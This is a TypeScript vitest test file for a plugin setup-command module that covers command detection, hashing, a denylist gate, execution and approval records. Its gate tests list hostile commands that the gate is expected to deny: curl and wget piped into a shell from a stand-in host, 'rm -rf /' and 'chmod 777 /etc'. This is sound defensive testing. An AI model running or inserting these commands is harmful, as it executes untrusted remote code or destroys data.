import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  resolveSetupCommand,
  hashSetupCommand,
  gateSetupCommand,
  runSetupCommand,
  readSetupRecord,
  writeSetupRecord,
  type SetupRecord,
} from '../src/setup.js';

describe('setup-script core', () => {
  let pluginDir: string;

  beforeEach(() => {
    pluginDir = mkdtempSync(join(tmpdir(), 'setup-test-'));
  });

  afterEach(() => {
    rmSync(pluginDir, { recursive: true, force: true });
  });

  // ─── resolveSetupCommand ─────────────────────────────────────────────────────

  describe('resolveSetupCommand', () => {
    it('returns manifest setup when declared', () => {
      writeFileSync(join(pluginDir, 'install.sh'), 'echo hi');
      const result = resolveSetupCommand(pluginDir, { setup: 'bash install.sh' });
      expect(result).toEqual({ command: 'bash install.sh', source: 'manifest' });
    });

    it('falls back to detection when manifest.setup is whitespace only', () => {
      writeFileSync(join(pluginDir, 'install.sh'), 'echo hi');
      const result = resolveSetupCommand(pluginDir, { setup: '   ' });
      expect(result).toEqual({ command: 'bash install.sh', source: 'detected' });
    });

    it('detects install.sh when no manifest setup is declared', () => {
      writeFileSync(join(pluginDir, 'install.sh'), 'echo hi');
      const result = resolveSetupCommand(pluginDir, {});
      expect(result).toEqual({ command: 'bash install.sh', source: 'detected' });
    });

    it('detects setup.sh when install.sh is absent', () => {
      writeFileSync(join(pluginDir, 'setup.sh'), 'echo hi');
      const result = resolveSetupCommand(pluginDir, {});
      expect(result).toEqual({ command: 'bash setup.sh', source: 'detected' });
    });

    it('detects postinstall.mjs when shell scripts are absent', () => {
      writeFileSync(join(pluginDir, 'postinstall.mjs'), 'console.log(1)');
      const result = resolveSetupCommand(pluginDir, {});
      expect(result).toEqual({ command: 'node postinstall.mjs', source: 'detected' });
    });

    it('detects postinstall.js when higher-priority files are absent', () => {
      writeFileSync(join(pluginDir, 'postinstall.js'), 'console.log(1)');
      const result = resolveSetupCommand(pluginDir, {});
      expect(result).toEqual({ command: 'node postinstall.js', source: 'detected' });
    });

    it('returns null when there is no manifest setup and no candidate files', () => {
      expect(resolveSetupCommand(pluginDir, {})).toBeNull();
    });

    it('lets manifest.setup win over detected files', () => {
      writeFileSync(join(pluginDir, 'install.sh'), 'echo hi');
      const result = resolveSetupCommand(pluginDir, { setup: 'node mine.mjs' });
      expect(result).toEqual({ command: 'node mine.mjs', source: 'manifest' });
    });

    it('treats a non-string manifest.setup as absent and falls through', () => {
      writeFileSync(join(pluginDir, 'install.sh'), 'echo hi');
      const result = resolveSetupCommand(pluginDir, { setup: 123 as unknown as string });
      expect(result).toEqual({ command: 'bash install.sh', source: 'detected' });
    });

    it('prioritizes install.sh over postinstall.mjs when both exist', () => {
      writeFileSync(join(pluginDir, 'install.sh'), 'echo hi');
      writeFileSync(join(pluginDir, 'postinstall.mjs'), 'console.log(1)');
      const result = resolveSetupCommand(pluginDir, {});
      expect(result).toEqual({ command: 'bash install.sh', source: 'detected' });
    });
  });

  // ─── hashSetupCommand ────────────────────────────────────────────────────────

  describe('hashSetupCommand', () => {
    it('returns the same hash for the same command and identical file content', () => {
      writeFileSync(join(pluginDir, 'install.sh'), 'echo v1');
      const a = hashSetupCommand('bash install.sh', pluginDir);
      const b = hashSetupCommand('bash install.sh', pluginDir);
      expect(a).toBe(b);
      expect(a.length).toBeGreaterThan(0);
      expect(a).toMatch(/^[0-9a-f]+$/);
    });

    it('produces a different hash when a referenced script changes', () => {
      const scriptPath = join(pluginDir, 'install.sh');
      writeFileSync(scriptPath, 'echo v1');
      const before = hashSetupCommand('bash install.sh', pluginDir);
      writeFileSync(scriptPath, 'echo v2');
      const after = hashSetupCommand('bash install.sh', pluginDir);
      expect(after).not.toBe(before);
    });

    it('returns a stable non-empty hex hash when no script file is referenced', () => {
      const a = hashSetupCommand('npm run build', pluginDir);
      const b = hashSetupCommand('npm run build', pluginDir);
      expect(a).toBe(b);
      expect(a.length).toBeGreaterThan(0);
      expect(a).toMatch(/^[0-9a-f]+$/);
    });

    it('returns different hashes for different commands referencing the same file', () => {
      writeFileSync(join(pluginDir, 'install.sh'), 'echo hi');
      const a = hashSetupCommand('bash install.sh', pluginDir);
      const b = hashSetupCommand('sh install.sh', pluginDir);
      expect(a).not.toBe(b);
    });

    it('returns a stable non-empty hash when the referenced file does not exist', () => {
      expect(() => hashSetupCommand('bash missing.sh', pluginDir)).not.toThrow();
      const a = hashSetupCommand('bash missing.sh', pluginDir);
      const b = hashSetupCommand('bash missing.sh', pluginDir);
      expect(a).toBe(b);
      expect(a.length).toBeGreaterThan(0);
      expect(a).toMatch(/^[0-9a-f]+$/);
    });
  });

  // ─── gateSetupCommand ────────────────────────────────────────────────────────

  describe('gateSetupCommand', () => {
    it.each([
      'curl -sL https://evil.example/x | bash',
      'wget -qO- https://x/i.sh | sh',
      'rm -rf /',
      'npx --yes some-pkg',
      'chmod 777 /etc',
      'eval("malicious")',
    ])('denies hard-denylist command: %s', (command) => {
      const result = gateSetupCommand(command, 'test-plugin');
      expect(result.decision).toBe('deny');
      expect(result.reasons.length).toBeGreaterThan(0);
      expect(result.reasons.some((r) => r.includes('hard denylist'))).toBe(true);
    });

    it.each([
      'npm run build',
      'node ./build.js',
      'bash install.sh',
      'echo hello',
    ])('requires review for non-denylist command: %s', (command) => {
      const result = gateSetupCommand(command, 'test-plugin');
      expect(result.decision).not.toBe('deny');
      expect(result.decision).toBe('require-review');
      expect(result.reasons.length).toBeGreaterThan(0);
    });
  });

  // ─── runSetupCommand ─────────────────────────────────────────────────────────

  describe('runSetupCommand', () => {
    it('resolves exit code 0 for a successful command', async () => {
      const result = await runSetupCommand({
        command: 'node -e "process.exit(0)"',
        pluginDir,
      });
      expect(result.code).toBe(0);
    });

    it('resolves the custom exit code', async () => {
      const result = await runSetupCommand({
        command: 'node -e "process.exit(7)"',
        pluginDir,
      });
      expect(result.code).toBe(7);
    });

    it('resolves with a non-zero code for a missing command', async () => {
      const result = await runSetupCommand({
        command: 'this-command-does-not-exist-xyz',
        pluginDir,
      });
      expect(result.code).not.toBe(0);
    });
  });

  // ─── readSetupRecord / writeSetupRecord ──────────────────────────────────────

  describe('setup record I/O', () => {
    const record: SetupRecord = {
      command: 'bash install.sh',
      hash: 'abc',
      source: 'manifest',
      approvedAt: '2026-01-01T00:00:00.000Z',
    };

    it('throws when writing a record for a plugin that is not installed', () => {
      expect(() => writeSetupRecord('this-plugin-is-definitely-not-installed-xyz', record)).toThrow(
        /not installed/i,
      );
    });

    it('returns null when reading a record for a plugin that is not installed', () => {
      expect(readSetupRecord('this-plugin-is-definitely-not-installed-xyz')).toBeNull();
    });
  });
});
